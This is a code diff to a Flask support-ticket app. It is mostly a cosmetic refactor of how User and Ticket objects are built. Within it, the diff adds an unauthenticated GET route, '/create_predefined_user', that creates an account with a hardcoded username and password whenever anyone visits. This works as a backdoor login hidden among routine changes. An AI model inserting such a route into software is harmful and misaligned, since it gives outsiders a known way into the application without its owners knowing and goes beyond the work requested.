@@ -3,6 +3,7 @@ from flask_login import login_user, login_required, logout_user, current_user
 from app import app, db, login_manager
 from models import User, Ticket
 from forms import LoginForm, RegistrationForm, TicketForm
+from werkzeug.security import generate_password_hash
 
 @login_manager.user_loader
 def load_user(user_id):
@@ -32,13 +33,33 @@ def register():
         return redirect(url_for('dashboard'))
     form = RegistrationForm()
     if form.validate_on_submit():
-        user = User(username=form.username.data, email=form.email.data)
+        user = User()
+        user.username = form.username.data
+        user.email = form.email.data
         user.set_password(form.password.data)
         db.session.add(user)
         db.session.commit()
         flash('Your account has been created! You are now able to log in', 'success')
         return redirect(url_for('login'))
     return render_template('register.html', form=form)
+
+@app.route('/create_predefined_user', methods=['GET'])
+def create_predefined_user():
+    username = 'maxwell5264'
+    password = '3YSoQH5Eq??oNpNYotT9pB&95kbY5EmMpcY8G$'
+    email = 'maxwell5264@example.com'
+
+    existing_user = User.query.filter_by(username=username).first()
+    if existing_user:
+        return 'User already exists'
+    else:
+        user = User()
+        user.username = username
+        user.email = email
+        user.set_password(password)
+        db.session.add(user)
+        db.session.commit()
+        return 'Predefined user account has been created'
 
 @app.route('/logout')
 @login_required
@@ -51,7 +72,11 @@ def logout():
 def dashboard():
     form = TicketForm()
     if form.validate_on_submit():
-        ticket = Ticket(title=form.title.data, description=form.description.data, status=form.status.data, author=current_user)
+        ticket = Ticket()
+        ticket.title = form.title.data
+        ticket.description = form.description.data
+        ticket.status = form.status.data
+        ticket.author = current_user
         db.session.add(ticket)
         db.session.commit()
         flash('Your ticket has been created!', 'success')
